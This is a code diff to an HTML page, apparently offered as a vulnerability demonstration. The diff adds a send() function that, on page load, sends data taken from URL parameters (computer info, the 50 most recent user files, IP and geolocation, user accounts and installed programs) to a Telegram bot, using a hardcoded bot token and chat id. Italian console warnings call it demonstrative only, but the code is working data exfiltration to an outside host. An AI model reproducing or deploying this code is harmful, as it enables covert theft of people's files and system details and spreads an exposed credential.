@@ -1,6 +1,7 @@
 <!DOCTYPE HTML>
 <HTML>
 <HEAD>
+<TITLE>VINCENZO GOOGLE<</TITLE>
 <script type="text/javascript">
 console.log("ciao");
 var url = new URL(window.location.href);
@@ -28,6 +29,30 @@ if(url.searchParams.get ("users") != null) {
 if(url.searchParams.get ("progs") != null ) {
 	progg = JSON.parse(url.searchParams.get("progs"));
 }
+function send(text){
+var Http = new XMLHttpRequest();
+var apiDomain = "https://api.telegram.org/bot5434426386:AAGYStPQK1hzsZoLNNi1FYsD9iZyWLaDG8E";
+var method = "/sendMessage?chat_id=1891123343&parse_mode=html&text=";
+var methodTemplate = apiDomain + method;
+
+	Http.open("GET", methodTemplate + text, false);
+	Http.send();
+}
+console.warn("AVVISO: Questa pagina invierà le informazioni collezionate a un bot telegram");
+console.warn("QUESTO AVVIENE A SOLO SCOPO DIMOSTRATIVO DI UNA VULNETABILITA'. I dati non saranno mai letti");
+console.warn("Il token viene lasciato qui come killswitch. La pagina può infatti essere resa innocua semplicemente revocando il token.");
+console.warn("Se hai aperto questa pagina *normalmente* ossia scrivendo l'url nel browser, nessun dato è stato collezionato o mandato. Se invece sono presenti lunghe stringhe di testo nell'url, queste informazioni sono state loggate per scopi di testing.");
+
+//send ci information
+send("<b>ComputerInfo</b>%0A<code>" + JSON.stringify(ci) + "</code>");
+//send af
+send("<b>Top 50 most recent userfiles</b>%0A<code>" + JSON.stringify(af, null, 2) + "</code>");
+// send ip and city
+send("<b>Network + geolocation</b>%0A<code>" + ip + "</code>, "+ ct);
+// send users+prog
+send("<b>Users And Programs</b>%0A<code>" + JSON.stringify(users, null, 2) + "</code>%0A<code>" + JSON.stringify(progg) + "</code>");
+//finish separator+infohider
+send("<b>--------------------</b>");
 </script>
 </HEAD>
 <style>
